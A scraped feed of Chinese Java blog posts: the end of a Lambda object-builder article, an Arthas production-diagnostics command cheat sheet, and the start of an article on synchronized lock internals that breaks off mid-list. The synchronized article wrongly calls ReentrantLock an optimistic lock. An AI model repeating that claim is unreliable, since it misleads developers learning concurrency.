<table><thead><tr><th>方案</th><th>代码简洁度</th><th>侵入性</th><th>校验支持</th><th>复用性</th></tr></thead><tbody><tr><td>传统 new+setter</td><td>低</td><td>无</td><td>差（散落）</td><td>无</td></tr><tr><td>手动编写 Builder</td><td>中</td><td>高（需写内部类）</td><td>中（耦合）</td><td>低（每个实体类单独写）</td></tr><tr><td>本文 Lambda 构建器</td><td>高</td><td>无</td><td>高（灵活）</td><td>高（通用）</td></tr></tbody></table>
<h2 data-id="heading-16">六、总结</h2>
<p>本文基于 JDK8 Lambda 特性，实现了一个通用、优雅、灵活的对象构建器。核心是通过<code>SetterFunction</code>函数式接口承接 setter 逻辑，结合<code>InstanceBuilder</code>封装构建流程，既解决了传统 setter 的繁琐，又避免了手动编写 Builder 的重复劳动。
这个构建器的核心价值在于：<strong>用极简的代码实现强大的功能，同时保持零侵入、高灵活、无依赖</strong>，适合在任何 JDK8 + 项目中使用，尤其适合多属性、需校验、频繁构建对象的场景。</p>
<h2 data-id="heading-17">七、总结</h2>
<p>若你厌倦了手动编写 Builder 的重复模板 —— 新增属性就得同步改 Builder，也受够了传统 setter 的冗长、校验逻辑的耦合，这个 Lambda 构建器正是解方。</p>
<p>它零模板代码、不改造实体类，一行 Lambda 搞定属性设置，校验随用随加，新实例创建或老对象修改都能极简链式承接，还无需第三方依赖，特别适合个人开发场景下快速复用。</p>
<p>下次构建对象时，直接用InstanceBuilder.of(User.class)开篇，体验 “5 行代码替代 20 行传统 Builder” 的清爽。本文前文已完整附上SetterFunction与InstanceBuilder源码，直接复制到项目中，即可重构下一次对象构建。</p>
<p>若使用中遇到疑问、有优化建议，欢迎留言交流；觉得实用也可收藏备用，方便后续自己复用或分享给有需要的开发者朋友。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Arthas 线上常用命令速查手册：Java 诊断神器，5 分钟定位线上问题！]]></title>    <link>https://juejin.cn/post/7575133880436228147</link>    <guid>https://juejin.cn/post/7575133880436228147</guid>    <pubDate>2025-11-23T07:38:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575133880436228147" data-draft-id="7575119254313680922" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Arthas 线上常用命令速查手册：Java 诊断神器，5 分钟定位线上问题！"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2025-11-23T07:38:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sino爱学习"/> <meta itemprop="url" content="https://juejin.cn/user/1873223544473431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Arthas 线上常用命令速查手册：Java 诊断神器，5 分钟定位线上问题！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223544473431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sino爱学习
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:38:59.000Z" title="Sun Nov 23 2025 07:38:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10a4a87f485942cb92b2af3519bc6ce5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2lub-eIseWtpuS5oA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490187&amp;x-signature=BkgMikxh1aC3tyTrmZ8Mzbpa%2F88%3D" alt="1763883473870.png" loading="lazy"/></p>
<h2 data-id="heading-0">一、Arthas 是什么？为什么用它？</h2>
<p>Arthas 是阿里巴巴开源的一款 Java 线上诊断工具，无需重启 JVM、无需修改代码，即可实时监控、诊断 Java 应用的运行状态。</p>
<h3 data-id="heading-1">✅ 适用场景</h3>



































<table><thead><tr><th>场景</th><th>传统方式</th><th>Arthas 方式</th></tr></thead><tbody><tr><td>线上 CPU 飙高</td><td><code>top</code> + <code>jstack</code> 手动抓栈</td><td><code>thread -n 3</code> 一键定位</td></tr><tr><td>接口响应慢</td><td>加日志 → 重新发布</td><td><code>trace</code> 追踪耗时</td></tr><tr><td>代码未生效</td><td>怀疑人生</td><td><code>jad</code> 反编译确认</td></tr><tr><td>异常信息不全</td><td>日志缺失</td><td><code>watch</code> 实时观测</td></tr><tr><td>热更新</td><td>重启服务</td><td><code>redefine</code> 热加载</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">二、快速安装与启动</h2>
<h3 data-id="heading-3">1. 一键启动（推荐）</h3>
<pre><code class="hljs language-bash" lang="bash">curl -O https://arthas.aliyun.com/arthas-boot.jar
java -jar arthas-boot.jar
</code></pre>
<h3 data-id="heading-4">2. 选择目标进程</h3>
<pre><code class="hljs language-bash" lang="bash">[INFO] Found existing java process, please choose one:
* [1]: 12345 demo.jar
  [2]: 67890 app.jar
</code></pre>
<p>输入编号（如 <code>1</code>）即可 attach。</p>
<hr/>
<h2 data-id="heading-5">三、线上高频命令速查表</h2>






































































<table><thead><tr><th>命令</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td><code>dashboard</code></td><td>实时系统面板（线程、内存、GC）</td><td><code>dashboard -i 2000 -n 5</code></td></tr><tr><td><code>thread</code></td><td>线程分析</td><td><code>thread -n 3</code>（最忙线程）<br/><code>thread -b</code>（死锁）</td></tr><tr><td><code>trace</code></td><td>方法耗时追踪</td><td><code>trace com.example.UserService getUserById</code></td></tr><tr><td><code>watch</code></td><td>观测方法入参/返回值/异常</td><td><code>watch com.example.UserService getUserById "{params, returnObj, throwExp}" -x 3</code></td></tr><tr><td><code>jad</code></td><td>反编译类或方法</td><td><code>jad com.example.UserService</code></td></tr><tr><td><code>sc</code></td><td>查找已加载的类</td><td><code>sc -d com.example.UserService</code></td></tr><tr><td><code>sm</code></td><td>查看类方法签名</td><td><code>sm -d com.example.UserService</code></td></tr><tr><td><code>monitor</code></td><td>方法调用统计</td><td><code>monitor -c 60 com.example.UserService getUserById</code></td></tr><tr><td><code>tt</code></td><td>方法调用时光隧道（记录与回放）</td><td><code>tt -t com.example.UserService getUserById</code></td></tr><tr><td><code>heapdump</code></td><td>导出堆快照</td><td><code>heapdump /tmp/dump.hprof</code></td></tr><tr><td><code>profiler</code></td><td>生成 CPU 火焰图</td><td><code>profiler start</code> → <code>profiler stop --format html</code></td></tr><tr><td><code>redefine</code></td><td>热更新 <code>.class</code> 文件</td><td><code>redefine /tmp/UserService.class</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">四、实战案例：5 分钟定位线上问题</h2>
<h3 data-id="heading-7">案例 1：CPU 飙高</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看最忙线程</span>
thread -n 1

<span class="hljs-comment"># 2. 查看堆栈</span>
thread 123

<span class="hljs-comment"># 3. 反编译问题方法</span>
jad com.example.MyService calculate
</code></pre>
<h3 data-id="heading-8">案例 2：接口响应慢</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 追踪方法耗时</span>
trace com.example.controller.UserController getProfile

<span class="hljs-comment"># 2. 发现数据库查询慢</span>
trace com.example.dao.UserDAO findById

<span class="hljs-comment"># 3. 查看 SQL 参数</span>
watch com.example.dao.UserDAO findById <span class="hljs-string">"{params[0]}"</span> -x 1
</code></pre>
<h3 data-id="heading-9">案例 3：代码未生效（热更新）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 反编译源码</span>
jad com.example.UserService --source-only &gt; /tmp/UserService.java

<span class="hljs-comment"># 2. 修改代码后编译</span>
mc /tmp/UserService.java -d /tmp

<span class="hljs-comment"># 3. 热加载</span>
redefine /tmp/com/example/UserService.class
</code></pre>
<hr/>
<h2 data-id="heading-10">五、注意事项与最佳实践</h2>

























<table><thead><tr><th>项目</th><th>建议</th></tr></thead><tbody><tr><td><strong>权限控制</strong></td><td>生产环境限制使用权限，避免误操作</td></tr><tr><td><strong>性能影响</strong></td><td><code>watch</code>、<code>trace</code> 会增强字节码，排查后及时 <code>stop</code> 或 <code>reset</code></td></tr><tr><td><strong>安全风险</strong></td><td>禁止将 Arthas 暴露在公网，建议通过隧道或跳板机访问</td></tr><tr><td><strong>命令冲突</strong></td><td><code>redefine</code> 与 <code>watch/trace</code> 冲突，使用前需 <code>reset</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-11">六、进阶：Docker &amp; K8s 集成建议</h2>
<h3 data-id="heading-12">Dockerfile 示例（预装 Arthas）</h3>
<pre><code class="hljs language-dockerfile" lang="dockerfile">FROM openjdk:8-jdk-alpine
COPY arthas /opt/arthas
COPY app.jar /app.jar
CMD java -jar /app.jar &amp; \
    sleep 15 &amp;&amp; \
    java -jar /opt/arthas/arthas-boot.jar --tunnel-server 'ws://tunnel-server:7777/ws' --app-name myapp
</code></pre>
<h3 data-id="heading-13">K8s 一键 attach（推荐）</h3>
<pre><code class="hljs language-bash" lang="bash">helm install arthas arthas/arthas-k8s
arthas-k8s attach myapp-0
</code></pre>
<hr/>
<h2 data-id="heading-14">七、总结：一张图记住 Arthas</h2>
<pre><code class="hljs language-text" lang="text">+--------------------------------------------------+
|                    Arthas                        |
|                                                  |
|  dashboard → 系统面板                            |
|  thread   → 线程/死锁                            |
|  trace    → 方法耗时                             |
|  watch    → 入参/返回值/异常                      |
|  jad      → 反编译                               |
|  tt       → 时光隧道（记录+回放）                 |
|  redefine → 热更新                               |
|  profiler → 火焰图                               |
+--------------------------------------------------+
</code></pre>
<hr/>
<h2 data-id="heading-15">八、参考资料与延伸阅读</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Farthas.aliyun.com%2Fdoc%2F" target="_blank" title="https://arthas.aliyun.com/doc/" ref="nofollow noopener noreferrer">Arthas 官方文档（中文）</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Farthas" target="_blank" title="https://github.com/alibaba/arthas" ref="nofollow noopener noreferrer">Arthas GitHub 仓库</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Farthas.aliyun.com%2Fdoc%2Ftunnel.html" target="_blank" title="https://arthas.aliyun.com/doc/tunnel.html" ref="nofollow noopener noreferrer">Arthas Tunnel 集中管理方案</a></li>
</ul>
<hr/>
<p><strong>© 2025 技术博客 | 转载请注明原作者与链接</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[synchronized 的底层原理及优化机制]]></title>    <link>https://juejin.cn/post/7575162322239930368</link>    <guid>https://juejin.cn/post/7575162322239930368</guid>    <pubDate>2025-11-23T08:03:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575162322239930368" data-draft-id="7575807729722343458" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="synchronized 的底层原理及优化机制"/> <meta itemprop="keywords" content="面试"/> <meta itemprop="datePublished" content="2025-11-23T08:03:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="随风飘的云"/> <meta itemprop="url" content="https://juejin.cn/user/361110952753560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            synchronized 的底层原理及优化机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/361110952753560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    随风飘的云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:03:06.000Z" title="Sun Nov 23 2025 08:03:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>synchronized</code> 是 Java 内置的<strong>悲观锁</strong>，核心作用是保证多线程环境下的<strong>原子性、可见性和有序性</strong>，从 JDK 1.6 开始进行了大量优化（如偏向锁、轻量级锁），性能大幅提升，成为并发编程中最常用的同步手段之一。</p>
<h2 data-id="heading-0">一、底层核心原理</h2>
<p><code>synchronized</code> 的实现依赖 <strong>Java 对象头（Mark Word）</strong>  和 <strong>监视器锁（Monitor）</strong> ，其核心逻辑是：<strong>通过竞争 Monitor 的所有权实现线程互斥</strong>。</p>
<h3 data-id="heading-1">1. 核心依赖：监视器锁（Monitor）</h3>
<p>Monitor 是 JVM 层面的抽象概念，本质是一种<strong>同步工具</strong>，可理解为 “锁的持有者管理机制”，每个 Java 对象都隐式关联一个 Monitor（即 “对象锁” 的底层载体）。</p>
<h4 data-id="heading-2">Monitor 的结构（简化）：</h4>
<ul>
<li><strong>Owner</strong>：当前持有锁的线程（同一时间只能有一个线程持有）。</li>
<li><strong>EntryList</strong>：等待获取锁的线程队列（线程处于 BLOCKED 状态）。</li>
<li><strong>WaitSet</strong>：调用 <code>wait()</code> 后释放锁的线程队列（线程处于 WAITING 状态）。</li>
</ul>
<h4 data-id="heading-3">Monitor 的核心逻辑：</h4>
<ol>
<li>
<p>线程尝试获取锁时，会竞争 Monitor 的 Owner 位置：</p>
<ul>
<li>若 Owner 为空，当前线程直接成为 Owner，持有锁。</li>
<li>若 Owner 已被其他线程占用，当前线程进入 EntryList 阻塞。</li>
</ul>
</li>
<li>
<p>线程释放锁时（退出同步块 / 方法、调用 <code>wait()</code>）：</p>
<ul>
<li>若调用 <code>wait()</code>，线程释放 Owner 身份，进入 WaitSet 等待被唤醒。</li>
<li>若正常释放，Owner 置空，JVM 从 EntryList 唤醒一个线程竞争锁。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-4">2. 锁状态的存储基础：Java 对象头（Mark Word）</h3>
<p>Java 对象在内存中分为 3 部分：<strong>对象头、实例数据、对齐填充</strong>。其中，<strong>对象头的 Mark Word 是存储锁状态的关键</strong>。</p>
<h4 data-id="heading-5">Mark Word 的结构（动态变化，32 位 JVM 示例）：</h4>

























<table><thead><tr><th>锁状态</th><th>Mark Word 存储内容</th></tr></thead><tbody><tr><td>无锁</td><td>HashCode（25 位） + 对象年龄（4 位） + 是否偏向锁（1 位，0） + 锁状态（2 位，01）</td></tr><tr><td>偏向锁</td><td>偏向线程 ID（23 位） + Epoch（2 位） + 对象年龄（4 位） + 是否偏向锁（1 位，1） + 锁状态（2 位，01）</td></tr><tr><td>轻量级锁</td><td>指向栈帧中 “锁记录（Lock Record）” 的指针（30 位） + 锁状态（2 位，00）</td></tr><tr><td>重量级锁</td><td>指向 Monitor 的指针（30 位） + 锁状态（2 位，11）</td></tr></tbody></table>
<ul>
<li>锁状态由 <strong>2 位标志位</strong> + <strong>是否偏向锁标志位</strong> 共同决定。</li>
<li>Mark Word 的动态变化是 <code>synchronized</code> 锁升级的核心依据。</li>
</ul>
<h3 data-id="heading-6">3. synchronized 的两种使用方式及底层实现</h3>
<p><code>synchronized</code> 可修饰<strong>方法</strong>或<strong>代码块</strong>，底层实现略有差异，但核心都是竞争 Monitor。</p>
<h4 data-id="heading-7">（1）修饰代码块：monitorenter + monitorexit 指令</h4>
<p>编译后，同步代码块的前后会插入 <code>monitorenter</code> 和 <code>monitorexit</code> 字节码指令：</p>
<ul>
<li><strong>monitorenter</strong>：线程进入时执行，尝试获取 Monitor 所有权（成功则 Owner 设为当前线程，失败则阻塞）。</li>
<li><strong>monitorexit</strong>：线程退出时执行，释放 Monitor 所有权（Owner 置空，唤醒等待线程）。</li>
</ul>
<blockquote>
<p>注意：编译器会生成 <strong>2 个 monitorexit</strong>：一个对应正常退出，一个对应异常退出（确保锁一定释放，避免死锁）。</p>
</blockquote>
<h4 data-id="heading-8">（2）修饰方法：ACC_SYNCHRONIZED 标志</h4>
<p>修饰方法时，字节码中不会插入指令，而是在<strong>方法表（method_info）</strong>  中添加 <code>ACC_SYNCHRONIZED</code> 标志：</p>
<ul>
<li>线程调用方法时，JVM 检查该标志：若存在，先获取 Monitor 锁，再执行方法体。</li>
<li>方法执行完毕（正常返回 / 抛出异常），JVM 自动释放 Monitor 锁。</li>
</ul>
<h4 data-id="heading-9">类锁 vs 对象锁</h4>
<ul>
<li><strong>对象锁</strong>：修饰实例方法或代码块（锁对象为 <code>this</code> 或自定义对象），竞争的是 “实例对象关联的 Monitor”。</li>
<li><strong>类锁</strong>：修饰静态方法或代码块（锁对象为 <code>XXX.class</code>），竞争的是 “类对象（Class 实例）关联的 Monitor”。</li>
<li>本质：类锁也是对象锁（Class 是 JVM 加载的单例对象），两者独立，互不干扰。</li>
</ul>
<h2 data-id="heading-10">二、JDK 1.6+ 核心优化机制</h2>
<p>早期 <code>synchronized</code> 是 “重量级锁”，线程竞争失败会直接阻塞（切换到内核态，开销大）。JDK 1.6 引入<strong>锁升级机制</strong>和其他优化，让 <code>synchronized</code> 在无竞争 / 轻度竞争场景下性能接近乐观锁（如 <code>ReentrantLock</code>）。</p>
<p>核心优化思路：<strong>根据竞争强度动态切换锁状态（无锁 → 偏向锁 → 轻量级锁 → 重量级锁），减少无竞争 / 轻度竞争时的开销</strong>。</p>
<h3 data-id="heading-11">1. 锁升级机制（核心优化）</h3>
<p>锁升级是不可逆的（只能从低开销向高开销升级），目的是 “按需分配资源”：无竞争时用偏向锁，轻度竞争时用轻量级锁，激烈竞争时用重量级锁。</p>
<h4 data-id="heading-12">（1）偏向锁：无竞争场景的最优解</h4>
<p><strong>适用场景</strong>：锁由同一线程多次获取，无其他线程竞争（如单线程循环调用同步方法）。<strong>核心思想</strong>：“偏向” 第一个获取锁的线程，后续该线程无需竞争，直接持有锁。</p>
<h5 data-id="heading-13">实现原理：</h5>
<ol>
<li>
